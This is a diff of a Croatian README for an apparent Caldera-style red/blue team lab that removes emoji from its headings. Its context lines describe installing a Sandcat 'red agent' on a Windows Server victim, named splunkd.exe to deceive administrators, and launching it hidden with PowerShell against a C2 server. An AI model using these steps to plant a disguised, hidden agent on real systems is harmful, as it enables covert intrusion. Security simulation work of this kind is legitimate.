@@ -55,12 +55,12 @@ Nakon pokretanja servera, sučelju se pristupa putem browsera.
 
 ---
 
-## 🕵️‍♂️ Kreiranje Agenata
+## Kreiranje Agenata
 
 Agenti se instaliraju na **Windows Server** (žrtvu) putem PowerShell-a.
 **Važno:** Potrebno je otvoriti PowerShell kao **Administrator** i izvršiti odgovarajuću skriptu.
 
-### 🔴 Red Agent (Sandcat - splunkd.exe)
+### Red Agent (Sandcat - splunkd.exe)
 Ovaj agent simulira napadača. Skriva se pod imenom `splunkd.exe` kako bi zavarao administratore.
 
 ```powershell
@@ -76,11 +76,11 @@ rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
 Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
 ```
 
-## 🔵 Blue Agent (Defender - blue_agent.exe)
+## Blue Agent (Defender - blue_agent.exe)
 
 Ovaj agent služi za **Blue Team** simulacije i odgovor na incidente. Dizajniran je za tihu instalaciju i komunikaciju s C2 serverom.
 
-### 📥 Instalacija i Pokretanje
+### Instalacija i Pokretanje
 
 Kopirajte i pokrenite sljedeću naredbu u **PowerShell** terminalu (preporučuje se *Run as Administrator*):
 
